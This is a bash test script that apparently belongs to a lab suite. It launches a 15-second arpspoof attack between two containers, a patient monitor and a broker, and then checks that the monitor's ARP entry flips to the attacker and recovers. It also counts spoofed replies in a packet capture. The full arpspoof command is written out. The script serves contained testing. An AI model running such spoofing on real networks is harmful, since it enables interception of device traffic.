#!/usr/bin/env bash
# S7: confirm the capture records ARP spoofing and that the effect is reversible.
# arpspoof runs for 15 s between two lab containers (monitor .31 and broker .10) on
# the internal network; afterwards arpspoof restores the real mapping. We check the
# monitor's neighbour entry flips to the attacker's MAC during the run and back after.
source "$(dirname "$0")/common.sh"
cmd="timeout -s TERM 15 arpspoof -i eth0 -t 172.28.10.31 -r 172.28.10.10"
attacker_mac=$(mac_of attacker)
broker_mac=$(mac_of broker)
neigh() {
  docker compose exec -T patient-monitor ip neigh show 172.28.10.10 \
    | awk '{print $5}' | tr -d '\r\n'
}
before=$(neigh)
start=$(now)
docker compose exec -T attacker sh -c "$cmd" >/dev/null 2>&1 &
spoof=$!
sleep 8
during=$(neigh)
wait $spoof
stop=$(( $(now) + 1 ))
after=""
for _ in $(seq 1 30); do  # wait for the ARP cache to recover after arpspoof restores
  after=$(neigh)
  [ "$after" = "$broker_mac" ] && break
  sleep 1
done
sleep 2
n=$(pcap_count "$start" "$stop" \
    "arp.opcode == 2 && eth.src == $attacker_mac && arp.src.proto_ipv4 == 172.28.10.10")
evidence="broker=$broker_mac attacker=$attacker_mac; monitor entry for .10 before=$before during=$during after=$after; $n spoofed ARP replies in pcap"
if [ "$during" = "$attacker_mac" ] && [ "$after" = "$broker_mac" ] && [ "${n:-0}" -gt 0 ]; then
  record S7 "ARP spoofing works" PASS "$cmd" "$evidence"
else
  record S7 "ARP spoofing works" FAIL "$cmd" "$evidence"
fi
